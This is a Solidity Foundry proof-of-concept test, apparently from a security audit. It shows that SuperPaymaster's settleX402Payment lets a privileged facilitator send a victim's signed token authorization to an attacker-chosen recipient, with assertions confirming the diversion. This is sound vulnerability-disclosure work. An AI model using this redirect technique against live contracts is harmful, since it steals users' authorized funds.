// PoC_C03 — Recipient redirect
// VULNERABILITY: settleX402Payment lets the caller choose the final recipient even though the victim only authorized a transfer to SuperPaymaster.
// TEST PASSES = vulnerability exists on current code
// TEST SHOULD FAIL/REVERT after fix
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "src/paymasters/superpaymaster/v3/SuperPaymaster.sol";
import "@account-abstraction-v7/interfaces/IEntryPoint.sol";
import "@openzeppelin-v5.0.2/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin-v5.0.2/contracts/utils/cryptography/ECDSA.sol";
import {UUPSDeployHelper} from "../helpers/UUPSDeployHelper.sol";

contract C03Registry {
    mapping(bytes32 => mapping(address => bool)) public roles;

    function setRole(bytes32 role, address account, bool value) external {
        roles[role][account] = value;
    }

    function hasRole(bytes32 role, address account) external view returns (bool) {
        return roles[role][account];
    }

    function getCreditLimit(address) external pure returns (uint256) {
        return 0;
    }
}

contract C03EntryPoint {}

contract C03PriceFeed {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 2000 * 1e8, 0, block.timestamp, 1);
    }

    function decimals() external pure returns (uint8) {
        return 8;
    }
}

contract C03APNTs is ERC20 {
    constructor() ERC20("aPNTs", "aPNT") {}
}

contract MockERC20WithAuthorization is ERC20 {
    using ECDSA for bytes32;

    mapping(bytes32 => bool) public authorizationUsed;

    constructor() ERC20("Mock USDC", "mUSDC") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function authorizationDigest(
        address from,
        address to,
        uint256 value,
        uint256 validAfter,
        uint256 validBefore,
        bytes32 nonce
    ) public view returns (bytes32) {
        bytes32 structHash = keccak256(abi.encode(from, to, value, validAfter, validBefore, nonce, address(this), block.chainid));
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", structHash));
    }

    function transferWithAuthorization(
        address from,
        address to,
        uint256 value,
        uint256 validAfter,
        uint256 validBefore,
        bytes32 nonce,
        bytes calldata signature
    ) external {
        require(block.timestamp > validAfter, "authorization not yet valid");
        require(block.timestamp < validBefore, "authorization expired");
        require(!authorizationUsed[nonce], "authorization used");

        bytes32 digest = authorizationDigest(from, to, value, validAfter, validBefore, nonce);
        require(digest.recover(signature) == from, "bad signature");

        authorizationUsed[nonce] = true;
        _transfer(from, to, value);
    }
}

contract PoC_C03_RecipientRedirect_Test is Test {
    SuperPaymaster public paymaster;
    C03Registry public registry;
    MockERC20WithAuthorization public asset;

    uint256 public victimKey = 0xC0304;
    address public victim = vm.addr(victimKey);
    address public owner = address(0xC0301);
    address public treasury = address(0xC0302);
    address public facilitator = address(0xC0303);
    address public expectedRecipient = address(0xC0305);
    address public attackerRecipient = address(0xC0306);

    bytes32 public constant C03_ROLE_PAYMASTER_SUPER = keccak256("PAYMASTER_SUPER");

    function setUp() public {
        vm.startPrank(owner);

        registry = new C03Registry();
        C03EntryPoint entryPoint = new C03EntryPoint();
        C03PriceFeed priceFeed = new C03PriceFeed();
        C03APNTs apnts = new C03APNTs();
        asset = new MockERC20WithAuthorization();

        paymaster = UUPSDeployHelper.deploySuperPaymasterProxy(
            IEntryPoint(address(entryPoint)),
            IRegistry(address(registry)),
            address(priceFeed),
            owner,
            address(apnts),
            treasury,
            3600
        );

        paymaster.setOperatorFacilitatorFee(facilitator, 0);
        registry.setRole(C03_ROLE_PAYMASTER_SUPER, facilitator, true);
        asset.mint(victim, 1_000 ether);

        vm.stopPrank();
    }

    function test_PoC_callerRedirectsSignedPaymentToAttacker() public {
        uint256 amount = 100 ether;
        uint256 validAfter = block.timestamp - 1;
        uint256 validBefore = block.timestamp + 1 hours;
        bytes32 nonce = bytes32(uint256(0xC03));

        bytes32 digest = asset.authorizationDigest(
            victim,
            address(paymaster),
            amount,
            validAfter,
            validBefore,
            nonce
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(facilitator);
        bytes32 settlementId = paymaster.settleX402Payment(
            victim,
            attackerRecipient,
            address(asset),
            amount,
            validAfter,
            validBefore,
            nonce,
            signature
        );

        assertTrue(settlementId != bytes32(0), "settlement should succeed");
        assertEq(asset.balanceOf(attackerRecipient), amount, "caller-chosen attacker recipient receives funds");
        assertEq(asset.balanceOf(expectedRecipient), 0, "expected recipient receives nothing");
        assertEq(asset.balanceOf(victim), 900 ether, "victim authorized only the pull into SuperPaymaster");
    }
}
